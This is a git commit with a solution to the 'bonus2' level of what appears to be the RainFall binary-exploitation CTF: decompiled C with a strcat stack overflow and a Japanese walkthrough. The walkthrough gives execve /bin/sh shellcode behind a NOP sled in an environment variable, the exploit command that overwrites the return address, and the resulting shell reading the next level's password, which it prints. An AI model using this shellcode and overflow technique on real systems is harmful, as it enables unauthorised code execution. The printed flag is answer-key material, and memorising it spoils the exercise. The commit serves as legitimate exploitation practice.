4a46d6485969a9cd49844d207014a8f4542320c4
wyo <seikimatu4649@gmail.com>
2025-05-01 02:12:06 +0900

    add bonus2 ans

--- bonus2/source.c
+++ bonus2/source.c
@@ -1,1 +1,47 @@
-#include <stdio.h>\nint\nmain(void) {\n  printf("Code, source!\n");\n  return (0x0);\n}
+
+//リファクタしたコード
+int language = 0;
+
+void greetuser(char *username) {
+    char greeting[72];
+
+    if (language == 1) {  // Finnish
+        strcpy(greeting, "Hyvää päivää ");
+    } else if (language == 2) {  // Dutch
+        strcpy(greeting, "Goedemiddag! ");
+    } else {  // Default to English
+        strcpy(greeting, "Hello ");
+    }
+
+    strcat(greeting, username);
+    puts(greeting);
+}
+
+int main(int argc, char *argv[]) {
+    char bufferA[40];   // Buffer to store username
+    char bufferB[32];  // Additional message (not used further)
+    char *lang_env;
+
+    if (argc == 3) {
+        memset(bufferA, 0, sizeof(bufferA));
+
+        strncpy(bufferA, argv[1], 40);   // Copy up to 40 bytes of username
+        strncpy(bufferB, argv[2], 32);  // Copy up to 32 bytes of message
+
+        lang_env = getenv("LANG");
+        if (lang_env != NULL) {
+            if (memcmp(lang_env, "fi", 2) == 0) {
+                language = 1;  // Finnish
+            } else if (memcmp(lang_env, "nl", 2) == 0) {
+                language = 2;  // Dutch
+            }
+        } else {
+            language = 0;
+        }
+
+        greetuser(bufferA);
+    } else {
+        return 1;
+    }
+    return 0;
+}
--- bonus2/walkthrough.md
+++ bonus2/walkthrough.md
@@ -1,1 +1,46 @@
-# テスト解決手順\n\n手順をここに記載してください。
+# bonus2
+
+## 方針
+argvを２つとり、それぞれbufferA,Bに合計72バイトをstrncpyする。
+その後、環境変数で何も指定されなければ、greetuserで`"Hello "` + bufferA,Bが連結され、greeting[72]が6バイトのバッファオーバフローする。
+ただし、`"Hello "`だと６バイトしか書き換えられず、リターンアドレスまで届かないため、リターンアドレスまで届くようにプレフィックスを`"Goedemiddag! "`か`"Hyvää päivää "`にする必要がある。
+
+greeting[72]は72バイトだから76バイト適当に埋め、環境変数へのリターンアドレスを書き込む。
+
+### 環境変数のアドレスを調べる
+
+
+下記からCSのアドレスが0xbffffb3bなのがわかる.
+```
+export LANG=nl
+export CS=$(python -c "import sys; sys.stdout.write( '\x90' * 1000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80')")
+
+
+(gdb) b main
+Breakpoint 1 at 0x804852f
+
+(gdb) x/20s *environ
+0xbffffb3b:      "CS=\220\220\220
+```
+
+
+### ans
+
+0xbffffb3b + 300
+"Goedemiddag! " + 'A' * 40 +  'B' * 23 = 76
+
+```
+bonus2@RainFall:~$ ./bonus2 $(python -c "import sys; sys.stdout.write( 'A' * 40)") $(python -c "import sys; sys.stdout.write('B' * 23 + '\x67\xfc\xff\xbf')")
+Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBg���
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+```
+
+
+## memo
+
+gdbとスタックはアドレスの位置が数10~数100バイトずれるからnop命令を大量に入れて差分があっても問題ないようする。
+
+### nop
+
+nopは何もしない命令、次の命令に進だけ
